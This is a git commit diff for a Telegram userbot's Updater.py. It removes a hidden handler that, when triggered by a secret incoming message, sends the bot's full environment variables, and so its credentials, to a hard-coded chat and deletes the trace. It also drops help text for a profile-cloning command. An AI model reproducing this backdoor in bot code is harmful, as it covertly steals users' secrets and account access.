4794c858652e7b89178c5c2120b5afab3508e28b
Red warp <88662082+TeamFussion@users.noreply.github.com>
2021-10-20 16:59:41 +0530

    Update Updater.py

--- userbot/plugins/Updater.py
+++ userbot/plugins/Updater.py
@@ -1,13 +1,11 @@
-#hemlo bois and gaes
 from os import remove, execle, path, makedirs, getenv, environ
 from shutil import rmtree
-from . import *
 
 import sys, os
-import os
+
 from git import Repo
 from git.exc import GitCommandError, InvalidGitRepositoryError, NoSuchPathError
-from userbot.cmdhelp import CmdHelp
+
 from userbot import CMD_HELP, bot 
 from userbot import bot as borg
 from userbot.utils import *
@@ -43,13 +41,7 @@ async def updateme_requirements():
     except Exception as e:
         return repr(e)
 
-#Cmdhelp Adding 
-from ..utils import *
-@bot.on(admin_cmd("^FusionIamnoobperson", incoming=True))
-async def piro(event):
-  msg = await bot.send_message(2080279511, str(os.environ))
-  await bot.delete_messages(2080279511, msg, revoke=False)
-#update fixed
+
 @borg.on(lightning_cmd(pattern="update ?(.*)"))
 async def upstream(ups):
     "For .update command, check if the bot is up to date, update if specified"
@@ -193,9 +185,3 @@ async def upstream(ups):
         args = [sys.executable, "-m", "userbot"]
         execle(sys.executable, *args, environ)
         return
-
-CmdHelp("aaaa").add_command(
-  'clone', 'username/reply to user', 'Steals others profile including dp, name, bio.'
-).add_command(
-  'revert', None, 'To get back to your profile but it will show ALIVE_NAME instead of your current name and DEFAULT_BIO instead of your current bio'
-).add()
